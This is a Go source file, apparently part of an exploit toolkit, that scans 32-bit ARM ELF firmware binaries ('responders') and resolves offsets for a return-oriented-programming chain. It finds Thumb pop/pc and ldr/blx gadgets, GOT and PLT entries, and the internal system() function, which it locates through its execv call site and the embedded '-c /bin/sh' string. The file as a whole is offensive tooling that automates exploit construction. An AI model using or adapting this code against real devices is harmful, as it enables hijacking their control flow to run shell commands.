package elfscan

import (
	"bytes"
	"crypto/sha256"
	"debug/elf"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"sort"
	"strings"
)

type Section struct {
	Name string `json:"name"`
	Addr uint64 `json:"addr"`
	Size uint64 `json:"size"`
}

type Offsets struct {
	System             int64  `json:"system"`
	SystemARM          int64  `json:"system_arm"`
	PopGadget          int64  `json:"pop_gadget"`
	PopGadgetMask      int64  `json:"pop_gadget_mask"`
	PopGadgetHalfword  int64  `json:"pop_gadget_halfword"`
	LdrBlxGadget       int64  `json:"ldr_blx_gadget"`
	LdrBlxGadgetARM    int64  `json:"ldr_blx_gadget_arm"`
	GotBase            int64  `json:"got_base"`
	StackDelta         *int64 `json:"stack_delta"`
	StackDeltaVerified bool   `json:"stack_delta_verified"`
}

type Evidence struct {
	ExecvGOT        int64  `json:"execv_got"`
	ExecvPLT        int64  `json:"execv_plt"`
	ExecvCallSite   int64  `json:"execv_call_site"`
	SystemPrologue  string `json:"system_prologue"`
	StringTableAddr int64  `json:"string_table_addr"`
	PopGadgetCount  int    `json:"pop_gadget_candidates"`
	LdrBlxCount     int    `json:"ldr_blx_gadget_candidates"`
	ExecvCallCount  int    `json:"execv_call_sites"`
}

type SymbolPLT struct {
	GOT int64 `json:"got"`
	PLT int64 `json:"plt"`
}

type Result struct {
	File     string               `json:"file"`
	SHA256   string               `json:"sha256"`
	Class    string               `json:"class"`
	Machine  string               `json:"machine"`
	Entry    uint64               `json:"entry"`
	Sections []Section            `json:"sections"`
	Offsets  Offsets              `json:"offsets"`
	Evidence Evidence             `json:"evidence"`
	Symbols  map[string]SymbolPLT `json:"symbols,omitempty"`
	// Limitations lists the chain offsets that could not be resolved for this
	// responder generation. A non-empty list still yields a usable Result: the
	// offsets that were resolved (system/got) are recorded as-is.
	Limitations []string `json:"limitations,omitempty"`
}

const (
	popGadgetHalfword     = 0xBD7A
	popGadgetHalfwordAltA = 0xBD76
	popGadgetHalfwordAltB = 0xBD78
	ldrBlxPattern         = "\xf8\x6a\x98\x47"
	// The in-binary system() argv block. String pools pad between literals
	// differently across toolchains, so accept both layouts.
	stringPatternFallback = "-c\x00/bin/sh\x00"
	stringPattern         = "-c\x00\x00/bin/sh\x00"
	thumbPushR7LR         = 0xB580
	thumbSubSpMask        = 0xFF80
	thumbSubSpValue       = 0xB080
	thumbAddR7Sp0         = 0xAF00

	relPltEntrySize = 8
	plt0Size        = 20
	pltStubSize     = 12
)

func Scan(path string) (*Result, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	f, err := elf.NewFile(bytes.NewReader(raw))
	if err != nil {
		return nil, fmt.Errorf("parse ELF: %w", err)
	}
	if f.Class != elf.ELFCLASS32 || f.Machine != elf.EM_ARM || f.Data != elf.ELFDATA2LSB {
		return nil, fmt.Errorf("unsupported ELF: class=%v machine=%v data=%v", f.Class, f.Machine, f.Data)
	}
	sum := sha256.Sum256(raw)
	res := &Result{
		File:    path,
		SHA256:  hex.EncodeToString(sum[:]),
		Class:   f.Class.String(),
		Machine: f.Machine.String(),
		Entry:   f.Entry,
	}

	text := f.Section(".text")
	got := f.Section(".got")
	if got == nil {
		got = f.Section(".got.plt")
	}
	plt := f.Section(".plt")
	relPlt := f.Section(".rel.plt")
	dynsym := f.Section(".dynsym")
	dynstr := f.Section(".dynstr")
	if text == nil || got == nil || plt == nil || relPlt == nil || dynsym == nil || dynstr == nil {
		return nil, errors.New("required sections missing (.text/.got/.plt/.rel.plt/.dynsym/.dynstr)")
	}
	for _, s := range []*elf.Section{text, got, plt, relPlt, dynsym, dynstr} {
		res.Sections = append(res.Sections, Section{Name: s.Name, Addr: s.Addr, Size: s.Size})
	}
	res.Offsets.GotBase = int64(got.Addr)

	if err := scanGadgets(res, text); err != nil {
		res.Limitations = append(res.Limitations, err.Error())
	}
	if err := scanSystem(res, raw, f, text, got, plt, relPlt, dynsym, dynstr); err != nil {
		res.Limitations = append(res.Limitations, "system(): "+err.Error())
	}
	res.Symbols = map[string]SymbolPLT{}
	for _, name := range []string{"execv", "unlink", "fork", "waitpid", "exit", "system"} {
		g, p, err := resolveSymbolPLT(f, plt, relPlt, dynsym, dynstr, name)
		if err != nil {
			continue
		}
		res.Symbols[name] = SymbolPLT{GOT: int64(g), PLT: int64(p)}
	}
	return res, nil
}

func resolveSymbolPLT(f *elf.File, plt, relPlt, dynsym, dynstr *elf.Section, name string) (uint64, uint64, error) {
	idx, err := symbolIndex(f, dynsym, dynstr, name)
	if err != nil {
		return 0, 0, err
	}
	got, err := relocOffset(f, relPlt, idx)
	if err != nil {
		return 0, 0, err
	}
	pltAddr, err := pltStubForGOT(f, plt, got)
	if err != nil {
		return 0, 0, err
	}
	return got, pltAddr, nil
}

// popCensus summarises the aligned `pop {...pc}` halfwords whose register list
// would be chain-compatible (carries r3 for the indirect call or r0 for a
// direct call), newest-generation responders included. It is evidence only:
// nothing is derived from it.
func popCensus(data []byte) string {
	counts := map[uint16]int{}
	for i := 0; i+2 <= len(data); i += 2 {
		hw := binary.LittleEndian.Uint16(data[i:])
		if hw&0xFF00 != 0xBD00 {
			continue
		}
		list := uint8(hw & 0xFF)
		if list&(1<<3) == 0 && list&(1<<0) == 0 {
			continue
		}
		counts[hw]++
	}
	var hws []int
	for hw := range counts {
		hws = append(hws, int(hw))
	}
	sort.Ints(hws)
	var out []string
	for _, h := range hws {
		hw := uint16(h)
		var regs []string
		for r := range 8 {
			if hw&(1<<uint(r)) != 0 {
				regs = append(regs, fmt.Sprintf("r%d", r))
			}
		}
		out = append(out, fmt.Sprintf("%#x{pop %s,pc}:%d", hw, strings.Join(regs, ","), counts[hw]))
	}
	if len(out) == 0 {
		return "none"
	}
	return strings.Join(out, " ")
}

func scanGadgets(res *Result, text *elf.Section) error {
	data, err := text.Data()
	if err != nil {
		return err
	}
	popMasks := []uint16{0xBD7A, 0xBD78, 0xBD3A, 0xBD38}
	counts := map[uint16][]uint64{}
	var ldrHits []uint64
	for i := 0; i+2 <= len(data); i += 2 {
		hw := binary.LittleEndian.Uint16(data[i:])
		for _, m := range popMasks {
			if hw == m {
				counts[m] = append(counts[m], text.Addr+uint64(i))
			}
		}
	}
	for i := 0; i+4 <= len(data); i += 2 {
		if bytes.Equal(data[i:i+4], []byte(ldrBlxPattern)) {
			ldrHits = append(ldrHits, text.Addr+uint64(i))
		}
	}
	for _, m := range popMasks {
		if len(counts[m]) > 0 {
			res.Evidence.PopGadgetCount += len(counts[m])
		}
	}
	res.Evidence.LdrBlxCount = len(ldrHits)

	var chosenHalfword uint16
	var chosenAddr uint64
	var countsList []string
	for _, m := range popMasks {
		countsList = append(countsList, fmt.Sprintf("%#x:%d", m, len(counts[m])))
		if chosenAddr == 0 && len(counts[m]) == 1 {
			chosenHalfword = m
			chosenAddr = counts[m][0]
		}
	}
	if chosenAddr == 0 {
		return fmt.Errorf("no uniquely occurring chain-compatible pop gadget in .text (candidates %s); chain-relevant pop-with-pc sites: %s",
			strings.Join(countsList, " "), popCensus(data))
	}
	if len(ldrHits) != 1 {
		return fmt.Errorf("ldr/blx gadget ambiguous or missing: %d candidates at %v", len(ldrHits), hexList(ldrHits))
	}
	res.Offsets.PopGadgetHalfword = int64(chosenHalfword)
	res.Offsets.PopGadget = int64(chosenAddr) + 1
	res.Offsets.PopGadgetMask = int64(chosenHalfword & 0xFF)
	res.Offsets.LdrBlxGadget = int64(ldrHits[0]) + 1
	res.Offsets.LdrBlxGadgetARM = int64(ldrHits[0])
	return nil
}

func scanSystem(res *Result, raw []byte, f *elf.File, text, got, plt, relPlt, dynsym, dynstr *elf.Section) error {
	execvIdx, err := symbolIndex(f, dynsym, dynstr, "execv")
	if err != nil {
		return err
	}
	execvGOT, err := relocOffset(f, relPlt, execvIdx)
	if err != nil {
		return err
	}
	res.Evidence.ExecvGOT = int64(execvGOT)
	execvPLT, err := pltStubForGOT(f, plt, execvGOT)
	if err != nil {
		return err
	}
	res.Evidence.ExecvPLT = int64(execvPLT)

	strVA, err := findStringVA(raw, f, stringPattern)
	if err != nil {
		strVA, err = findStringVA(raw, f, stringPatternFallback)
		if err != nil {
			return err
		}
	}
	res.Evidence.StringTableAddr = int64(strVA)

	textData, err := text.Data()
	if err != nil {
		return err
	}
	var calls []uint64
	for i := 0; i+4 <= len(textData); i += 2 {
		h1 := binary.LittleEndian.Uint16(textData[i:])
		if h1&0xF800 != 0xF000 {
			continue
		}
		h2 := binary.LittleEndian.Uint16(textData[i+2:])
		at := text.Addr + uint64(i)
		switch {
		case h2&0xD000 == 0xD000:
			if decodeBL(h1, h2, at) == execvPLT {
				calls = append(calls, at)
			}
		case h2&0xD000 == 0xC000:
			if decodeBLX(h1, h2, at) == execvPLT {
				calls = append(calls, at)
			}
		}
	}
	res.Evidence.ExecvCallCount = len(calls)
	if len(calls) != 1 {
		return fmt.Errorf("expected exactly 1 call site to execv@plt %#x, found %d at %v", execvPLT, len(calls), hexList(calls))
	}
	callSite := calls[0]
	res.Evidence.ExecvCallSite = int64(callSite)

	start, err := functionStart(text, callSite)
	if err != nil {
		return err
	}
	prologue, err := verifyPrologue(text, start)
	if err != nil {
		prologue, err = verifyPrologueRelaxed(text, start)
	}
	if err != nil {
		return err
	}
	res.Evidence.SystemPrologue = prologue

	if err := verifyStringRef(text, start, callSite, strVA); err != nil {
		return err
	}
	res.Offsets.SystemARM = int64(start)
	res.Offsets.System = int64(start) + 1
	return nil
}

func symbolIndex(f *elf.File, dynsym, dynstr *elf.Section, name string) (uint32, error) {
	data, err := dynsym.Data()
	if err != nil {
		return 0, fmt.Errorf("read .dynsym: %w", err)
	}
	strs, err := dynstr.Data()
	if err != nil {
		return 0, fmt.Errorf("read .dynstr: %w", err)
	}
	if len(data)%16 != 0 {
		return 0, fmt.Errorf(".dynsym size %d not a multiple of 16", len(data))
	}
	for i := 0; i+16 <= len(data); i += 16 {
		nameOff := binary.LittleEndian.Uint32(data[i:])
		if int(nameOff) >= len(strs) {
			continue
		}
		end := bytes.IndexByte(strs[nameOff:], 0)
		if end < 0 {
			continue
		}
		if string(strs[nameOff:nameOff+uint32(end)]) == name {
			return uint32(i / 16), nil
		}
	}
	return 0, fmt.Errorf("symbol %q not found in .dynsym", name)
}

func relocOffset(f *elf.File, relPlt *elf.Section, symIdx uint32) (uint64, error) {
	data, err := relPlt.Data()
	if err != nil {
		return 0, err
	}
	if len(data)%relPltEntrySize != 0 {
		return 0, fmt.Errorf(".rel.plt size %d not a multiple of %d", len(data), relPltEntrySize)
	}
	var found []uint64
	for off := 0; off < len(data); off += relPltEntrySize {
		rInfo := binary.LittleEndian.Uint32(data[off+4:])
		if rInfo>>8 == symIdx {
			found = append(found, uint64(binary.LittleEndian.Uint32(data[off:])))
		}
	}
	if len(found) != 1 {
		return 0, fmt.Errorf("expected 1 relocation for symbol index %d, found %d", symIdx, len(found))
	}
	return found[0], nil
}

func armImm12(word uint32) uint32 {
	imm8 := word & 0xFF
	rot := (word >> 8) & 0xF
	return (imm8 >> (2 * rot)) | (imm8 << (32 - 2*rot))
}

func pltStubForGOT(f *elf.File, plt *elf.Section, target uint64) (uint64, error) {
	data, err := plt.Data()
	if err != nil {
		return 0, err
	}
	for off := plt0Size; off+pltStubSize <= len(data); off += pltStubSize {
		w0 := binary.LittleEndian.Uint32(data[off:])
		w1 := binary.LittleEndian.Uint32(data[off+4:])
		w2 := binary.LittleEndian.Uint32(data[off+8:])
		if w0&0xFFFFF000 != 0xE28FC000 || w1&0xFFFFF000 != 0xE28CC000 || w2&0xFFFFF000 != 0xE5BCF000 {
			continue
		}
		addr := plt.Addr + uint64(off)
		gotAddr := addr + 8 + uint64(armImm12(w0)) + uint64(armImm12(w1)) + uint64(w2&0xFFF)
		if gotAddr == target {
			return addr, nil
		}
	}
	return 0, fmt.Errorf("no .plt stub loads GOT slot %#x", target)
}

func findStringVA(raw []byte, f *elf.File, pattern string) (uint64, error) {
	idx := bytes.Index(raw, []byte(pattern))
	if idx < 0 {
		return 0, fmt.Errorf("pattern %q not found", pattern)
	}
	for _, s := range f.Sections {
		if s.Type == elf.SHT_NOBITS || s.Size == 0 {
			continue
		}
		if uint64(idx) >= s.Offset && uint64(idx) < s.Offset+s.Size {
			return s.Addr + uint64(idx) - s.Offset, nil
		}
	}
	return 0, fmt.Errorf("cannot map file offset %#x to a section", idx)
}

func decodeBL(h1, h2 uint16, at uint64) uint64 {
	S := uint32(h1>>10) & 1
	imm10 := uint32(h1) & 0x3FF
	J1 := uint32(h2>>13) & 1
	J2 := uint32(h2>>11) & 1
	imm11 := uint32(h2) & 0x7FF
	I1 := 1 - (J1 ^ S)
	I2 := 1 - (J2 ^ S)
	imm := (S << 24) | (I1 << 23) | (I2 << 22) | (imm10 << 12) | (imm11 << 1)
	off := int64(int32(imm<<7) >> 7)
	return uint64(int64(at) + 4 + off)
}

func decodeBLX(h1, h2 uint16, at uint64) uint64 {
	S := uint32(h1>>10) & 1
	imm10 := uint32(h1) & 0x3FF
	J1 := uint32(h2>>13) & 1
	J2 := uint32(h2>>11) & 1
	imm10l := (uint32(h2) >> 1) & 0x3FF
	I1 := 1 - (J1 ^ S)
	I2 := 1 - (J2 ^ S)
	imm := (S << 24) | (I1 << 23) | (I2 << 22) | (imm10 << 12) | (imm10l << 2)
	off := int64(int32(imm<<7) >> 7)
	return uint64(int64(at) + 4 + off)
}

func functionStart(text *elf.Section, at uint64) (uint64, error) {
	data, err := text.Data()
	if err != nil {
		return 0, err
	}
	if at < text.Addr || at >= text.Addr+text.Size {
		return 0, fmt.Errorf("call site %#x outside .text", at)
	}
	off := int(at - text.Addr)
	// Pass 1 keeps the historical shape exactly (push {r7,lr}; sub sp,#imm;
	// add r7,sp,#0) so builds that already scan keep their offsets. Pass 2 only
	// runs when pass 1 finds nothing: newer responders frame system() with
	// callee-saved registers (push {r4,r5,r7,lr}) or without a stack adjust.
	for i := off &^ 1; i >= 0; i -= 2 {
		hw := binary.LittleEndian.Uint16(data[i:])
		if hw == thumbPushR7LR {
			if _, err := verifyPrologue(text, text.Addr+uint64(i)); err == nil {
				return text.Addr + uint64(i), nil
			}
		}
	}
	for i := off &^ 1; i >= 0; i -= 2 {
		hw := binary.LittleEndian.Uint16(data[i:])
		if !isPushLR(hw) {
			continue
		}
		if _, err := verifyPrologueRelaxed(text, text.Addr+uint64(i)); err == nil {
			return text.Addr + uint64(i), nil
		}
	}
	return 0, fmt.Errorf("no push {...,lr} prologue found before call site %#x", at)
}

// isPushLR matches the 16-bit Thumb PUSH encoding with the LR bit set.
func isPushLR(hw uint16) bool {
	return hw&0xFE00 == 0xB400 && hw&0x0100 != 0
}

// verifyPrologueRelaxed accepts the wider system() frame shapes a different
// toolchain emits: push {...,lr}, an optional `sub sp, #imm`, then
// `add r7, sp, #0`.
func verifyPrologueRelaxed(text *elf.Section, at uint64) (string, error) {
	data, err := text.Data()
	if err != nil {
		return "", err
	}
	off := int(at - text.Addr)
	if off < 0 || off+6 > len(data) {
		return "", fmt.Errorf("prologue at %#x outside .text", at)
	}
	h0 := binary.LittleEndian.Uint16(data[off:])
	if !isPushLR(h0) {
		return "", fmt.Errorf("%#x: expected push {...,lr}, got %#x", at, h0)
	}
	n := 2
	if hw := binary.LittleEndian.Uint16(data[off+2:]); hw&thumbSubSpMask == thumbSubSpValue {
		n = 4
	}
	if binary.LittleEndian.Uint16(data[off+n:]) != thumbAddR7Sp0 {
		return "", fmt.Errorf("%#x: expected add r7, sp, #0 after push, got %#x", at,
			binary.LittleEndian.Uint16(data[off+n:]))
	}
	return hex.EncodeToString(data[off : off+n+2]), nil
}

func verifyPrologue(text *elf.Section, at uint64) (string, error) {
	data, err := text.Data()
	if err != nil {
		return "", err
	}
	off := int(at - text.Addr)
	if off < 0 || off+6 > len(data) {
		return "", fmt.Errorf("prologue at %#x outside .text", at)
	}
	h0 := binary.LittleEndian.Uint16(data[off:])
	h1 := binary.LittleEndian.Uint16(data[off+2:])
	h2 := binary.LittleEndian.Uint16(data[off+4:])
	if h0 != thumbPushR7LR {
		return "", fmt.Errorf("%#x: expected push {r7,lr}, got %#x", at, h0)
	}
	if h1&thumbSubSpMask != thumbSubSpValue {
		return "", fmt.Errorf("%#x: expected sub sp, #imm after push, got %#x", at, h1)
	}
	if h2 != thumbAddR7Sp0 {
		return "", fmt.Errorf("%#x: expected add r7, sp, #0, got %#x", at, h2)
	}
	return hex.EncodeToString(data[off : off+6]), nil
}

// stringRefWindow bounds how far an `add rX, pc` may trail its `ldr rX,[pc,#imm]`
// in the relaxed pass; newer toolchains interleave unrelated instructions.
const stringRefWindow = 16

func verifyStringRef(text *elf.Section, start, callSite, strVA uint64) error {
	data, err := text.Data()
	if err != nil {
		return err
	}
	if stringRefAt(text, data, start, callSite, strVA, false) {
		return nil
	}
	if stringRefAt(text, data, start, callSite, strVA, true) {
		return nil
	}
	return fmt.Errorf("function at %#x does not reference string %#x via ldr/add pc pattern", start, strVA)
}

// stringRefAt reports whether the function starting at `start` loads `strVA`
// through the PIC idiom `ldr rX,[pc,#imm]; add rX,pc`. The legacy pass requires
// the add to follow immediately (historical behaviour); the relaxed pass allows
// it a few instructions later.
func stringRefAt(text *elf.Section, data []byte, start, callSite, strVA uint64, relaxed bool) bool {
	from := int(start-text.Addr) &^ 1
	to := int(callSite - text.Addr)
	if to > len(data) {
		to = len(data)
	}
	for i := from; i+4 <= to; i += 2 {
		hw := binary.LittleEndian.Uint16(data[i:])
		if hw&0xF800 != 0x4800 {
			continue
		}
		rt := (hw >> 8) & 0x7
		base := (text.Addr + uint64(i) + 4) &^ 3
		litOff := int(base-text.Addr) + int(hw&0xFF)*4
		if litOff+4 > len(data) {
			continue
		}
		value := uint64(binary.LittleEndian.Uint32(data[litOff:]))
		if !relaxed {
			if binary.LittleEndian.Uint16(data[i+2:]) != 0x4478|rt {
				continue
			}
			target := value + text.Addr + uint64(i) + 6
			if target >= strVA && target < strVA+uint64(len(stringPattern)) {
				return true
			}
			continue
		}
		for j := i + 2; j+2 <= to && j <= i+stringRefWindow; j += 2 {
			if binary.LittleEndian.Uint16(data[j:]) != 0x4478|rt {
				continue
			}
			target := value + ((text.Addr + uint64(j) + 4) &^ 3)
			if target >= strVA && target < strVA+uint64(len(stringPattern)) {
				return true
			}
			break
		}
	}
	return false
}

func hexList(vals []uint64) []string {
	out := make([]string, len(vals))
	for i, v := range vals {
		out[i] = fmt.Sprintf("%#x", v)
	}
	return out
}
